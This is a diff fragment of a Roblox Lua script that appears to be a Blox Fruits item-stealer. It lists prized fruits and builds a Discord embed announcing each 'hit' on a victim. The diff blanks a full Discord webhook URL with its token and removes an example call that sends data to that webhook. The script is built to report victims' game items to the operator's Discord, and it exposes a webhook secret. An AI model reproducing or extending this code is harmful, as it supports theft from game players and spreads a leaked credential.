@@ -1,4 +1,4 @@
-Webhook = "https://discordapp.com/api/webhooks/1363467805696987136/puUE-9zz3QzAteNP8Gvqk8xTw62ps3Djx30OUnBT1NWKKWVJA-Xq2PpSoa5fXCD-DnbB"
+Webhook = ""
 Usernames = {"", ""}
 Fruits = {"Portal-Portal", "Phoenix-Phoenix", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
 FruitsToReset = {
@@ -579,6 +579,7 @@ local function formatPremiumItems()
     
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
 end
+
 local embed = {
     title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
@@ -603,11 +604,6 @@ local embed = {
     }
 }
 
-
-
-
--- Send example webhook
-sendWebhook(exampleEmbed)
 local isMobile = game:GetService("UserInputService").TouchEnabled
 
 local webhookCache = {
